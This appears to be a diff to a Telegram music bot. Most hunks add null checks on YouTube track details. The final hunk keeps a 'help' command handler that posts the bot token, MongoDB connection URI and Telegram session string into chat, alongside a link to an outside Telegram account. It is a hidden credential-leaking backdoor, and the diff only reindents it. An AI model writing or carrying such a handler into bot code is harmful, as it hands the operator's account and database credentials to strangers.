@@ -211,6 +211,8 @@ async def play_commnd(
                 details, track_id = await YouTube.track(
                     f"https://www.youtube.com/watch?v={videoid}"
                 )
+                if not details:
+                    return await mystic.edit_text(_["play_3"])
                 streamtype = "youtube"
                 img = details["thumb"]
                 cap = _["play_11"].format(
@@ -222,6 +224,8 @@ async def play_commnd(
                     details, track_id = await YouTube.track(url)
                 except Exception as e:
                     print(e)
+                    return await mystic.edit_text(_["play_3"])
+                if not details:
                     return await mystic.edit_text(_["play_3"])
                 streamtype = "youtube"
                 img = details["thumb"]
@@ -393,10 +397,16 @@ async def play_commnd(
             details, track_id = await YouTube.track(query)
         except Exception:
             return await mystic.edit_text(_["play_3"])
+        
+        # FIXED: Added check for details
+        if not details:
+            return await mystic.edit_text(_["play_3"])
+            
         streamtype = "youtube"
     if str(playmode) == "Direct":
         if not plist_type:
-            if details["duration_min"]:
+            # FIXED: Added safety check for details.get()
+            if details and details.get("duration_min"):
                 duration_sec = time_to_seconds(details["duration_min"])
                 if duration_sec > config.DURATION_LIMIT:
                     return await mystic.edit_text(
@@ -530,7 +540,13 @@ async def play_music(client, CallbackQuery, _):
         details, track_id = await YouTube.track(vidid, True)
     except Exception:
         return await mystic.edit_text(_["play_3"])
-    if details["duration_min"]:
+    
+    # FIXED: Check if details is None
+    if not details:
+        return await mystic.edit_text(_["play_3"])
+
+    # FIXED: Safe access
+    if details and details.get("duration_min"):
         duration_sec = time_to_seconds(details["duration_min"])
         if duration_sec > config.DURATION_LIMIT:
             return await mystic.edit_text(
@@ -593,12 +609,12 @@ STRING_SESSION = getenv("STRING_SESSION", "")
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://envs.sh/kNr.jpg",
+         photo=f"https://envs.sh/kNr.jpg",
        caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
-                      InlineKeyboardButton(
+                     InlineKeyboardButton(
                          "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
                  ]
             ]
